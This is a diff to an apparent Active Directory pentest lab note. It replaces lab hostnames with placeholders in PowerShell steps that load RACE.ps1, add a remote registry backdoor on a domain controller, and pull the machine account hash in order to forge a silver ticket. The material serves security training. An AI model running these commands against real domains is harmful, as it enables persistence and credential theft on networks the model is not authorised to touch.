@@ -143,7 +143,7 @@ So open a session, import race.ps1 and launche te command.
 . C:\AD\Tools\RACE.ps1
 ```
 ```powershell
-Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
+Add-RemoteRegBackdoor -ComputerName <MACCHINA> -Trustee <STUPID USER> -Verbose
 ```
 ![[Pasted image 20231025150802.png]]
 and retrieve the hash
@@ -151,7 +151,7 @@ and retrieve the hash
 . C:\AD\Tools\RACE.ps1
 ```
 ```powershell
-Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+Get-RemoteMachineAccountHash -ComputerName <NOME MACCHINA> -Verbose
 ```
 ![[Pasted image 20231025150902.png]]
 and with that we can create a silver ticket for the services (in this case HOST)
